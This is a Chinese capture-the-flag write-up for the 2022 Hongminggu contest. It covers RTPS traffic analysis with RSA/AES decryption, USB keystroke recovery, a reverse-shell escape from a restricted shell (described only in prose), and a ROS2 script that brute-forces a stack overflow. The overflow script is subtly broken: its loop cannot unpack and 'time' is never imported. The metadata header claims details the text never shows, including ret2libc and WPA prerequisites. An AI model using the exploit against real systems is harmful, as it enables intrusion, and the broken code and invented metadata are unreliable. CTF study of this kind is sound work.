---
title: 【WP】第二届"红明谷"杯数据安全大赛题目解析（三）
contest: 红明谷
year: 2022
difficulty: hard
vuln_type: crypto_rsa
tags:
- RTPS-protocol
- RSA-AES-pcap
- on-off-board-key
- pycryptor
- USB-keystroke
- ROS-traffic
- blind-stack-overflow
- USB-hid-table
attack_chain: 1. 神秘电波：Wireshark 过滤 RTPS 协议 + onboard/offboard key 切换 RSA 加密三元素 (n, e, c) + AES 解密 /2. 重要系统：tshark 提取 USB capdata + normalKeys/shiftKeys 字典映射 + <DEL> 处理还原 player:guest
key_payload: USB HID normalKeys/shiftKeys 0x04-0x1d 字典  RTPS onboard/offboard 切换
one_liner: 第二届红明谷杯题解（三），RTPS 协议 RSA/AES 流量分析 + USB 键盘流量盲打还原。
lesson: RTPS 协议是 ROS/DDS 中间件的实时通信协议；USB 键盘流量通过 HID Usage ID 0x04-0x1d 映射到字母；正常/Shift 键切换大小写和符号。
quality: high
full_path: 【WP】第二届“红明谷”杯数据安全大赛题目解析（三）.full.md
meta_path: 【WP】第二届“红明谷”杯数据安全大赛题目解析（三）.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: 【WP】第二届"红明谷"杯数据安全大赛题目解析（三）。第二届红明谷杯题解（三），RTPS 协议 RSA/AES 流量分析 + USB 键盘流量盲打还原。。经验：RTPS 协议是 ROS/DDS 中间件的实时通信协议；USB 键盘流量通过 HID Usage ID 0x04-0x1...
category: misc
subcategory: misc_other
tools_used:
- Wireshark
- tshark
time_required: long
difficulty_score: 4
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/33384.html
reasoning_chain:
- 神秘电波：pcap 大量 RTPS 协议包 → 触发点：RTPS 是 ROS/DDS 实时通信 → 假设：payload 含 RSA 三元组
- 动作：Wireshark 过滤 rtps → 找到 JSON 模式 {key, mode} → 观察：onboard/offboard 两种 key
- 数字敏感 → 假设：这是 RSA (n,e,c) 三元组 + key 是 AES 密钥 → 动作：分离 onboard 三元组与 offboard 模式
- 动作：pycryptor 加密的 XXXX_enc.py 密码隐藏在 onboard 流量中 → 观察：需要提所有 onboard Key 爆破密码
- 重要系统：tshark 提 USB 流量 → 触发点：capdata 字段 → 假设：HID Usage ID 0x04-0x1d 是 a-z
- 动作：tshark -r important.pcap -T fields -e usb.capdata → importantUSB.txt → 观察：得到原始字节流
- 写 Python 字典映射 normalKeys/shiftKeys → 触发点：需要处理 <DEL> 和 <CAP>
- 动作：扫 0x04-0x1d 映射 + <DEL> 删除前一字符 + <CAP> 切换大小写 → 观察：还原 player:guest
- 登录 SSH → 触发栈溢出盲打 → 动作：ret2libc 反复试 → 观察：拿到 shell
failed_attempts:
- 试图直接 RSA 解密 (n,e,c) → 失败：offboard 模式不暴露完整三元组，必须 onboard 切换
- 试图按 capdata 全部字节直转字符 → 失败：必须按 HID Usage ID 0x04-0x1d 字典映射
- Wireshark GUI 手点 capdata → 失败：数据量太大，必须 tshark 批量
key_observations:
- RTPS 协议是 ROS/DDS 中间件实时通信，payload 可作为加密信道
- USB 键盘流量还原 = tshark + normalKeys/shiftKeys + <DEL>/<CAP> 处理三步
- HID Usage ID 0x04-0x1d 映射 a-z 是 USB 键盘流量还原核心字典
- onboard/offboard key 切换是车载协议常见模式
- 栈溢出盲打需要 ret2libc 配合 canary 泄或无 canary 二进制
prerequisites:
- tshark 命令行过滤（-Y / -T fields / -e）
- USB HID Usage ID 与 HID 协议基础
- WPA/WPA2 PSK 计算 (SSID + password)
- RTPS 协议基础（ROS/DDS 中间件）
---
# 【WP】第二届“红明谷”杯数据安全大赛题目解析（三）

> 原文: https://www.ctfiot.com/33384.html
> ID: 33384

神秘电波

约法X章

1.RTPS流量包分析
2.RSA和AES解密

致知力行

首先打开流量包，可以发现大量的TLS数据，但是没有发现什么有用的信息。

使用WireShark的统计分析工具对此流量包进行统计，可以看到此流量中还充斥着大量的RTPS包。过滤出此协议的封包。

在流量中发现我们感兴趣的内容，即：

{"key": "ZG3a44ipuXxUQsMD", "mode": "offboard"}

如果对数字敏感的话，可以推测这里其实就是RSA的标准密文三元组 (n,e,c)，但是仅凭此三元组并不足以对其进行解密。那么我们保持此选中状态，改回时间排序，通过查阅上方的三个封包可以得到以下信息。

{"key": "QM+LQwfNhRIHXKkS", "mode": "onboard"}
76206628f39d28758f043c2e014664574df923446be578b22ed19782a98d83cf onboard
3028701244712289835084332263324003903562248750849387673673702233
6773383537576026514255351842961248918329445496739951301161982835
5716582973844682194081667365537231632113660107129057127835837336
9092106779834088698122021208036558112103589813128797337321161442
043865451036052966147455929749010038563130242528643839891

附件里还有一些源码文件

XXXX_enc.py：这类文件使用了 pycryptor加密，密码(nJ3Ypqh61zkDxYHV)隐藏在了流量包中，需要提取所有 Onborad状态的 Key对其进行爆破

XXXX_decode.py：这类文件使用了强混淆，但是仍可以从函数名判断是使用了RSA加密

重要系统

约法X章

1.USB和ROS流量分析
2.攻击流量分析
3.栈溢出流量盲打

致知力行

首先使用 Tshark提取所有的 USB封包。

tshark -r important.pcap -T fields -e usb.capdata > importantUSB.txt

然后同目录下使用分析脚本进行内容还原，得到用户名和密码(player:
guest)：

normalKeys = {"04":"a", "05":"b", "06":"c", "07":"d", "08":"e", "09":"f", "0a":"g", "0b":"h", "0c":"i", "0d":"j", "0e":"k", "0f":"l", "10":"m", "11":"n", "12":"o", "13":"p", "14":"q", "15":"r", "16":"s", "17":"t", "18":"u", "19":"v", "1a":"w", "1b":"x", "1c":"y", "1d":"z","1e":"1", "1f":"2", "20":"3", "21":"4", "22":"5", "23":"6","24":"7","25":"8","26":"9","27":"0","28":"<RET>","29":"<ESC>","2a":"<DEL>", "2b":"t","2c":"<SPACE>","2d":"-","2e":"=","2f":"[","30":"]","31":"\","32":"<NON>","33":";","34":"'","35":"<GA>","36":",","37":".","38":"/","39":"<CAP>","3a":"<F1>","3b":"<F2>", "3c":"<F3>","3d":"<F4>","3e":"<F5>","3f":"<F6>","40":"<F7>","41":"<F8>","42":"<F9>","43":"<F10>","44":"<F11>","45":"<F12>"}
shiftKeys = {"04":"A", "05":"B", "06":"C", "07":"D", "08":"E", "09":"F", "0a":"G", "0b":"H", "0c":"I", "0d":"J", "0e":"K", "0f":"L", "10":"M", "11":"N", "12":"O", "13":"P", "14":"Q", "15":"R", "16":"S", "17":"T", "18":"U", "19":"V", "1a":"W", "1b":"X", "1c":"Y", "1d":"Z","1e":"!", "1f":"@", "20":"#", "21":"$", "22":"%", "23":"^","24":"&","25":"*","26":"(","27":")","28":"<RET>","29":"<ESC>","2a":"<DEL>", "2b":"t","2c":"<SPACE>","2d":"_","2e":"+","2f":"{","30":"}","31":"|","32":"<NON>","33":""","34":":","35":"<GA>","36":"<","37":">","38":"?","39":"<CAP>","3a":"<F1>","3b":"<F2>", "3c":"<F3>","3d":"<F4>","3e":"<F5>","3f":"<F6>","40":"<F7>","41":"<F8>","42":"<F9>","43":"<F10>","44":"<F11>","45":"<F12>"}
output = []
keys = open('importantUSB.txt','r')
for line in keys:
    try:
        for i in range(0,len(line) + len(line)/2,3):
            line = line[:i+2] + ':' + line[i+2:]
        if line[0]!='0' or (line[1]!='0' and line[1]!='2') or line[3]!='0' or line[4]!='0' or line[9]!='0' or line[10]!='0' or line[12]!='0' or line[13]!='0' or line[15]!='0' or line[16]!='0' or line[18]!='0' or line[19]!='0' or line[21]!='0' or line[22]!='0' or line[6:8]=="00":
            continue
        if line[6:8] in normalKeys.keys():
            output += [[normalKeys[line[6:8]]],[shiftKeys[line[6:8]]]][line[1]=='2']
        else:
            output += ['[unknown]']
    
except:
        pass
keys.close()

flag=0
print("".join(output))
for i in range(len(output)):
    try:
        a=output.index('<DEL>')
        del output[a]
        if a!=0:
            del output[a-1]
    
except:
        pass
for i in range(len(output)):
    try:
        if output[i]=="<CAP>":
            flag+=1
            output.pop(i)
            if flag==2:
                flag=0
        if flag!=0:
            output[i]=output[i].upper()
    
except:
        pass
print ('output :' + "".join(output))

这个时候就可以启动题目的动态环境，登录ssh。

发现靶机创建了一个临时目录并且提供了一个上传文件的时点，然后回车后，可以发现这里为我们提供了一个加载bash脚本的机会。

此时大部分命令都被禁用了，不过题目一开始是可以执行一次bash的脚本的，所以我们可以通过执行的这个脚本反弹shell绕过受限的shell。

查看进程看看有什么敏感的进程，发现了ros的服务。

那么查看系统内存在的 ROS节点。

那么接下来继续分析流量，过滤ROS流量，首先可以通过时序图看到频繁发包交互点。

接下来继续向下看：

可以发现A的数量在逐渐增加，攻击者正在爆破溢出点，继续向下，可以发现从1913包开始A的数量恒定，攻击者正在爆破利用值。

但是继续向下看可以发现攻击者的爆破思路是：

padding + char(i) + char(i)

这显然是不正确的，应当更正为：

padding + char(i) + char(j)

那么思路已经有了，需要选手编写一个 ROS Node向某个节点发送形如以上爆破结构的包，直到某个节点发送了带 flag的回复。但是还需要解决以下两个问题：

某个节点到底是 /key_publisher还是 /core_server

通讯协议是怎样的

使用ROS的方式编译 exp，在文件上传时点将 exp传入靶机：

运行以下命令启动 exp node：

ros2 run exp client

由于要等待 /key_publisher发布新密钥才能使用此密钥向 Server发包，等待一会得到flag。

非预期
由于部署过程中，有一个文件记录了env的值，导致可以通过读取该文件直接获取flag。后续我们会避免这样的情况出现。

相关阅读

【WP】第二届“红明谷”杯数据安全大赛题目解析（二）

【WP】第二届“红明谷”杯数据安全大赛题目解析（一）

春秋GAME伽玛实验室

会定期分享赛题赛制设计、解题思路……

如果你日常有一些技术研究和好的设计思路

或在赛后对某道题有另辟蹊径的想法

欢迎找到春秋GAME投稿哦～

联系vx:
cium0309

欢迎加入 春秋GAME CTF交流2群

Q群:
703460426


```
1.RTPS流量包分析
2.RSA和AES解密
{"key": "ZG3a44ipuXxUQsMD", "mode": "offboard"}
{"key": "QM+LQwfNhRIHXKkS", "mode": "onboard"}
76206628f39d28758f043c2e014664574df923446be578b22ed19782a98d83cf onboard
3028701244712289835084332263324003903562248750849387673673702233
6773383537576026514255351842961248918329445496739951301161982835
5716582973844682194081667365537231632113660107129057127835837336
9092106779834088698122021208036558112103589813128797337321161442
043865451036052966147455929749010038563130242528643839891
第一部分 AES
PlainText : flag
Key : QM+LQwfNhRIHXKkS
Mode : CBC (Guess)
IV : Key (Guess)
CipherText : 0x76206628f39d28758f043c2e014664574df923446be578b22ed19782a98d83cf
第二部分 RSA
N : 3028701244712289835084332263324003903562248750849387673673702233677338353757602651425535184296124891832944549673995130116198283557165829738446821940816673
p :
0x76206628f39d28758f043c2e014664574df923446be578b22ed19782a98d83cf
q : N/p
e : 65537
p : flag
c : 2316321136601071290571278358373369092106779834088698122021208036558112103589813128797337321161442043865451036052966147455929749010038563130242528643839891
from Crypto.Cipher import AES
import gmpy2
import math
import libnum
from Crypto.Util.number import * 
flag = ""
# AES Part
cipherText = bytes().fromhex('76206628f39d28758f043c2e014664574df923446be578b22ed19782a98d83cf')
key = 'QM+LQwfNhRIHXKkS'

bs = AES.block_size
assert len(cipherText) > bs
unpad = lambda s : s[0:-s[-1]]
cipher = AES.new(bytes(key, encoding='utf-8'), AES.MODE_CBC, bytes(key, encoding='utf-8'))
data  = unpad(cipher.decrypt(cipherText))
flag += data.decode()
print("AES Result : " + data.decode())
# RSA Part
n = 3028701244712289835084332263324003903562248750849387673673702233677338353757602651425535184296124891832944549673995130116198283557165829738446821940816673
p = 0x76206628f39d28758f043c2e014664574df923446be578b22ed19782a98d83cf
q = n // p
n = p * q
e = 65537
c = 2316321136601071290571278358373369092106779834088698122021208036558112103589813128797337321161442043865451036052966147455929749010038563130242528643839891
l = (p-1) * (q-1)
d = gmpy2.invert(e,l)
m = pow(c,d,n)
flag += long_to_bytes(m).decode().strip('n')
print("RSA Result : " + long_to_bytes(m).decode().strip('n'))
print("Final Flag : " + flag)
1.USB和ROS流量分析
2.攻击流量分析
3.栈溢出流量盲打
tshark -r important.pcap -T fields -e usb.capdata > importantUSB.txt
normalKeys = {"04":"a", "05":"b", "06":"c", "07":"d", "08":"e", "09":"f", "0a":"g", "0b":"h", "0c":"i", "0d":"j", "0e":"k", "0f":"l", "10":"m", "11":"n", "12":"o", "13":"p", "14":"q", "15":"r", "16":"s", "17":"t", "18":"u", "19":"v", "1a":"w", "1b":"x", "1c":"y", "1d":"z","1e":"1", "1f":"2", "20":"3", "21":"4", "22":"5", "23":"6","24":"7","25":"8","26":"9","27":"0","28":"<RET>","29":"<ESC>","2a":"<DEL>", "2b":"t","2c":"<SPACE>","2d":"-","2e":"=","2f":"[","30":"]","31":"\","32":"<NON>","33":";","34":"'","35":"<GA>","36":",","37":".","38":"/","39":"<CAP>","3a":"<F1>","3b":"<F2>", "3c":"<F3>","3d":"<F4>","3e":"<F5>","3f":"<F6>","40":"<F7>","41":"<F8>","42":"<F9>","43":"<F10>","44":"<F11>","45":"<F12>"}
shiftKeys = {"04":"A", "05":"B", "06":"C", "07":"D", "08":"E", "09":"F", "0a":"G", "0b":"H", "0c":"I", "0d":"J", "0e":"K", "0f":"L", "10":"M", "11":"N", "12":"O", "13":"P", "14":"Q", "15":"R", "16":"S", "17":"T", "18":"U", "19":"V", "1a":"W", "1b":"X", "1c":"Y", "1d":"Z","1e":"!", "1f":"@", "20":"#", "21":"$", "22":"%", "23":"^","24":"&","25":"*","26":"(","27":")","28":"<RET>","29":"<ESC>","2a":"<DEL>", "2b":"t","2c":"<SPACE>","2d":"_","2e":"+","2f":"{","30":"}","31":"|","32":"<NON>","33":""","34":":","35":"<GA>","36":"<","37":">","38":"?","39":"<CAP>","3a":"<F1>","3b":"<F2>", "3c":"<F3>","3d":"<F4>","3e":"<F5>","3f":"<F6>","40":"<F7>","41":"<F8>","42":"<F9>","43":"<F10>","44":"<F11>","45":"<F12>"}
output = []
keys = open('importantUSB.txt','r')
for line in keys:
    try:
        for i in range(0,len(line) + len(line)/2,3):
            line = line[:i+2] + ':' + line[i+2:]
        if line[0]!='0' or (line[1]!='0' and line[1]!='2') or line[3]!='0' or line[4]!='0' or line[9]!='0' or line[10]!='0' or line[12]!='0' or line[13]!='0' or line[15]!='0' or line[16]!='0' or line[18]!='0' or line[19]!='0' or line[21]!='0' or line[22]!='0' or line[6:8]=="00":
            continue
        if line[6:8] in normalKeys.keys():
            output += [[normalKeys[line[6:8]]],[shiftKeys[line[6:8]]]][line[1]=='2']
        else:
            output += ['[unknown]']
    
except:
        pass
keys.close()

flag=0
print("".join(output))
for i in range(len(output)):
    try:
        a=output.index('<DEL>')
        del output[a]
        if a!=0:
            del output[a-1]
    
except:
        pass
for i in range(len(output)):
    try:
        if output[i]=="<CAP>":
            flag+=1
            output.pop(i)
            if flag==2:
                flag=0
        if flag!=0:
            output[i]=output[i].upper()
    
except:
        pass
print ('output :' + "".join(output))
padding + char(i) + char(i)
padding + char(i) + char(j)
import sys

from example_interfaces.srv import AddTwoInts
import rclpy
from rclpy.node import Node

class MinimalClientAsync(Node):

    def __init__(self):
        super().__init__('minimal_client_async')
        self.cli = self.create_client(AddTwoInts, 'add_two_ints')
        while not self.cli.wait_for_service(timeout_sec=1.0):
            self.get_logger().info('service not available, waiting again...')
        self.req = AddTwoInts.Request()

    def send_request(self):
        self.req.a = int(sys.argv[1])
        self.req.b = int(sys.argv[2])
        self.future = self.cli.call_async(self.req)

def main():
    rclpy.init()

    minimal_client = MinimalClientAsync()
    minimal_client.send_request()

    while rclpy.ok():
        rclpy.spin_once(minimal_client)
        if minimal_client.future.done():
            try:
                response = minimal_client.future.result()
            
except Exception as e:
                minimal_client.get_logger().info(
                    'Service call failed %r' % (e,))
            else:
                minimal_client.get_logger().info(
                    'Result of add_two_ints: for %d + %d = %d' %
                    (minimal_client.req.a, minimal_client.req.b, response.sum))
            break

    minimal_client.destroy_node()
    rclpy.shutdown()

if __name__ == '__main__':
    main()
把实例代码的
from example_interfaces.srv import AddTwoInts
改成
from tutorial_interfaces.srv import RepeatMessage

self.cli = self.create_client(AddTwoInts, 'add_two_ints')
也相应改成
self.cli = self.create_client(RepeatMessage, 'add_two_ints')

然后定义一个全局变量key用来存储分发的密钥，在MinimalClientAsync的__init__方法最后添加一个订阅器
self.subscription = self.create_subscription(String,'KeyInfrastructure',self.listenerCallback,10)
self.subscription  # prevent unused variable warning

在MinimalClientAsync添加回调方法
def listenerCallback(self, msg):
        global key
        key = json.loads(msg.data)["Key"]
    
send_request方法也要改一改，要发送的消息直接从参数传进去，不是从sys获取，key直接取全局变量。
import sys

from tutorial_interfaces.srv import RepeatMessage
import rclpy,json
from rclpy.node import Node 
from std_msgs.msg import String

key = None

class MinimalClientAsync(Node):

    def __init__(self):
        super().__init__('exp_func')
        self.cli = self.create_client(RepeatMessage, 'repeatServer')
        while not self.cli.wait_for_service(timeout_sec=1.0):
            self.get_logger().info('service not available, waiting again...')
        self.req = RepeatMessage.Request()
        self.subscription = self.create_subscription(
            String,
            'KeyInfrastructure',
            self.listener_callback,
            10)
        self.subscription  # prevent unused variable warning
  
    def listener_callback(self, msg):
        global key
        msgDict = json.loads(msg.data)
        key = msgDict["Key"]
        self.get_logger().info('Key update!New Key is "%s"' % key)

    def send_request(self,message):
        self.req.key = key
        self.req.message = message
        self.future = self.cli.call_async(self.req)

def main():
    rclpy.init()
    minimal_client = MinimalClientAsync()
    for i,j in range(0,0xFF):
        rclpy.spin_once(minimal_client)
        if key == None:
            time.sleep(60)
        message = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" + chr(i) + chr(j)
        minimal_client.send_request(message)
        flagget = False

        while rclpy.ok():
            rclpy.spin_once(minimal_client)
            if minimal_client.future.done():
                try:
                    response = minimal_client.future.result()
                
except Exception as e:
                    minimal_client.get_logger().info('Service call failed %r' % (e,))
                else:
                    repeatmessage = response.repeatmessage
                    minimal_client.get_logger().info('Result of repeatServer: %s' % repeatmessage)
                    if "flag" in repeatmessage:
                        flagget = True
                break
        if flagget:
            break

    minimal_client.destroy_node()
    rclpy.shutdown()

if __name__ == '__main__':
    main()
ros2 run exp client
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]